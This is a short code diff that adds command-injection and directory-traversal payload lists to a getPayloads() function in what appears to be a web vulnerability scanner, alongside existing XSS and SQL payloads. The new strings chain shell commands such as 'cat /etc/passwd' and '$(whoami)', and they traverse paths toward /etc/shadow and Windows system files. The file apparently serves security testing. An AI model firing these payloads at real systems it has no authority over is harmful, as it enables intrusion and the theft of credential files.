@@ -13,7 +13,24 @@ export function getPayloads() {
       "<body onload=alert('XSS')>",
       "javascript:alert('XSS')"
     ];
+
+    const commandInjectionPayloads = [
+      "; ls -la",
+      "&& whoami",
+      "| id",
+      "|| cat /etc/passwd",
+      "`uname -a`",
+      "$(whoami)"
+    ];
   
-    return [...sqlPayloads, ...xssPayloads];
+    const directoryTraversalPayloads = [
+      "../../../../etc/passwd",
+      "../../../../../etc/shadow",
+      "../../../../../../../../../../windows/system32/config/system",
+      "../../../../../../../../../../boot.ini",
+      "../../../var/log/apache2/access.log"
+    ];
+  
+    return [...sqlPayloads, ...xssPayloads, ...commandInjectionPayloads, ...directoryTraversalPayloads];
   }
   
